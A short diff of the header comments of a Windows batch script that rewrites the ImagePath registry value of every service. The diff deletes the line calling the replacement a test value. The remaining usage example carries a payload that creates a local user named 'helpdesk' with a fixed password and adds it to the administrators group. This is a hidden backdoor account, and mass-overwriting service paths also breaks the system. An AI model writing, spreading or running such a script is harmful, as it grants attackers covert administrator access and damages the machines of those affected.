@@ -1,6 +1,5 @@
 @echo off
 :: Batch script to modify the ImagePath value for all services under the "Services" registry key.
-:: It replaces the ImagePath with a test value.
 :: Usage: ModifyServiceImagePath.bat "<new_image_path>"
 :: Usage: ModifyServiceImagePath.bat "cmd.exe /c net user helpdesk L3tm3!n /add ^&^& net localgroup administrators helpdesk /add"
 
